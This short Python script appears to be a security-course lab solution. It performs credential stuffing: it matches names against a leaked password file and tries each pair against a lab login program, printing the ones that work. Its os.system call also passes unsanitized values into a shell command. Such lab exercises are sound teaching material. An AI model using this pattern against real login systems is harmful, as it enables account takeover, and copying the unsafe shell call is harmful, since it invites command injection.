import time
import os

if __name__ in '__main__':
    start_time = time.time()
    leaked_passwords=[(i.strip()) for i in open('/home/cse/Lab1/Q4/PwnedPWfile')]
    gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]
    leaked_passwords = dict(i.split(',') for i in leaked_passwords)

    for name in gang_names:
        if name in leaked_passwords:
            if os.system('python3 ./Login.pyc'+ ' ' + name + ' ' + leaked_passwords[name] + " >/dev/null 2>&1") == 0:
                print(name, leaked_passwords[name], "--- %s seconds ---" % (time.time() - start_time))
                
